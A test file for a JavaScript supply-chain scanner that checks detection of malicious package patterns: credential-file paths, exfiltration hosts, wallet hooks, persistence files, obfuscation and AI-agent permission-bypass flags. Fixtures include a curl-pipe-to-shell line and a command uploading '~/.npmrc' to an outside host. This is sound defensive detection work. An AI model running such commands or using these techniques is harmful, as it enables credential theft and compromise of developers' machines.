import { test } from 'node:test';
import assert from 'node:assert/strict';
import { scanSource, shannonEntropy, isMinified } from '../src/modules/analysis/code-patterns.js';

const cases: [string, string, string][] = [
  ['child-process', 'exec', "require('child_process'); import cp from 'node:child_process'"],
  ['eval', 'exec', 'eval(benignFixture)'],
  ['new-function', 'exec', 'new Function(benignFixture)'],
  ['environment-dump', 'credentials', 'Object.keys(process.env); JSON.stringify(process.env)'],
  ['credential-path', 'credentials', '.npmrc .ssh/id_rsa .aws/credentials .config/gh .gitconfig'],
  ['exfil-host', 'exfil', 'https://webhook.site/fixture'],
  ['raw-ip-url', 'exfil', 'https://192.0.2.1/fixture'],
  ['github-repo-creation', 'exfil', 'https://api.github.com/user/repos'],
  ['trufflehog', 'credentials', 'trufflehog'],
  ['ethereum-hook', 'wallet', 'window.ethereum.request'],
  ['solana-hook', 'wallet', 'window.solana.signTransaction'],
  ['xhr-hook', 'wallet', 'XMLHttpRequest.prototype.open'],
  ['fetch-reassignment', 'wallet', 'globalThis.fetch = fixture'],
  ['ai-cli-bypass', 'ai-agent-abuse', 'claude --dangerously-skip-permissions'],
  ['shell-rc', 'persistence', '.bashrc .zshrc'],
  ['github-workflow', 'persistence', '.github/workflows/fixture.yml'],
  ['detached-exec', 'exec', "spawn('fixture', [], { detached: true })"],
  ['runtime-download', 'exec', 'github.com/oven-sh/bun/releases'],
  ['agent-autorun', 'ai-agent-abuse', '.claude/settings.json SessionStart'],
  ['blockchain-rpc', 'exfil', 'https://cloudflare-eth.com'],
  ['blockchain-dead-drop', 'exfil', `eth_call 0x${'a'.repeat(40)}`],
  ['hex-identifiers', 'obfuscation', '_0xabcdef '.repeat(20)],
  ['hex-escape-density', 'obfuscation', '\\x41'.repeat(50)],
  ['long-line', 'obfuscation', 'a'.repeat(5001)],
  ['multiple-wallet-addresses', 'wallet', ['a', 'b', 'c'].map(char => `0x${char.repeat(40)}`).join(' ')],
];

for (const [id, category, source] of cases) {
  test(`detects ${id} with bounded evidence`, () => {
    const hit = scanSource('index.js', `// harmless fixture\n${source}`).find(hit => hit.id === id);
    assert.ok(hit, id);
    assert.equal(hit.category, category);
    assert.equal(hit.line, 2);
    assert.ok(hit.snippet.length <= 120);
    assert.notEqual(hit.severity, 'critical');
  });
}

test('matches alternative hosts, credentials, runtime and autorun patterns', () => {
  for (const source of ['discord.com/api/webhooks/fixture', 'pastebin.com', 'sample.ngrok.io', 'transfer.sh']) {
    assert.ok(scanSource('x.js', source).some(hit => hit.id === 'exfil-host'));
  }
  for (const source of ['.npmrc', '.ssh/id_ed25519', '.aws/credentials', '.config/gh', '.gitconfig']) {
    assert.ok(scanSource('x.js', source).some(hit => hit.id === 'credential-path'));
  }
  for (const source of ['--yolo', '--trust-all-tools', '.vscode/tasks.json', 'folderOpen', '.cursor/rules']) {
    assert.ok(scanSource('x.js', source).some(hit => hit.category === 'ai-agent-abuse'));
  }
  for (const source of ['bun.sh/install', 'curl https://fixture.invalid/install | sh']) {
    assert.ok(scanSource('x.js', source).some(hit => hit.id === 'runtime-download'));
  }
  for (const source of ["import { spawn } from 'node:child_process'", "import {\n spawn\n} from 'node:child_process'", "import 'child_process'", "import('node:child_process')"]) {
    assert.ok(scanSource('x.js', source).some(hit => hit.id === 'child-process'));
  }
});

test('entropy, packed payloads, native install and minification thresholds', () => {
  const diverse = Array.from({ length: 90 }, (_, index) => String.fromCharCode(33 + index)).join('');
  assert.equal(shannonEntropy('aaaa'), 0);
  assert.equal(shannonEntropy(''), 0);
  assert.equal(shannonEntropy('aabb'), 1);
  assert.ok(shannonEntropy(diverse) > 5.5);
  assert.ok(scanSource('data.bin', diverse.repeat(4000)).some(hit => hit.id === 'packed-payload' && hit.severity === 'high'));
  assert.ok(scanSource('x.js', diverse.repeat(30)).some(hit => hit.id === 'high-entropy'));
  assert.ok(scanSource('binding.gyp', '{}').some(hit => hit.id === 'native-install' && hit.severity === 'high'));
  assert.ok(isMinified('a'.repeat(5001)));
  assert.ok(!isMinified('export const value = 1;\n'));
  assert.ok(!scanSource('index.min.js', 'a'.repeat(5001)).some(hit => hit.id === 'long-line'));
});

test('benign sources and subthreshold indicators do not trigger categories', () => {
  for (const source of ['export const add = (a, b) => a + b;', 'const node = process.env.NODE_ENV;',
    'fetch(url); const equal = fetch === expected;', '_0xabcdef '.repeat(19), 'eth_call',
    `0x${'a'.repeat(40)} 0x${'a'.repeat(40)} 0x${'b'.repeat(40)}`,
    '!function(){var a=[1,2,3];function n(v){return v==null?[]:v.map(function(x){return x+1})}return n(a)}();']) {
    assert.deepEqual(scanSource('index.js', source), [], source);
  }
});

test('1 MB pathological imports scan in under 300 ms', (t) => {
  const source = 'import' + ' '.repeat(1_000_000) + '!';
  const start = performance.now();
  const hits = scanSource('pathological.js', source);
  const elapsed = performance.now() - start;
  t.diagnostic(`1 MB pathological scan: ${elapsed.toFixed(1)} ms`);
  assert.ok(elapsed < 300, `scan took ${elapsed.toFixed(1)} ms`);
  assert.ok(!hits.some(hit => hit.id === 'child-process'));
});

test('dense escape and identifier counts retain bounded evidence', () => {
  const hits = scanSource('dense.js', '\\x41'.repeat(256 * 1024) + '\n' + '_0xabcdef;'.repeat(10000));
  assert.equal(hits.filter(hit => hit.id === 'hex-identifiers').length, 1);
  assert.equal(hits.filter(hit => hit.id === 'hex-escape-density').length, 1);
});

test('rules retain distinct matching lines and bound long-line novelty windows', () => {
  const hits = scanSource('index.js', "const deny = ['.npmrc'];\nexec('curl -T ~/.npmrc https://x');\n" + 'a'.repeat(1000) + " '.npmrc' " + 'b'.repeat(1000));
  const credentials = hits.filter(hit => hit.id === 'credential-path');
  assert.equal(credentials.length, 3);
  assert.equal(credentials[1].sourceLine, "exec('curl -T ~/.npmrc https://x');");
  assert.equal(credentials[2].sourceWindow, true);
  assert.equal(credentials[2].sourceLine?.length, 160);
  assert.ok(credentials[2].sourceLine?.includes('.npmrc'));
});
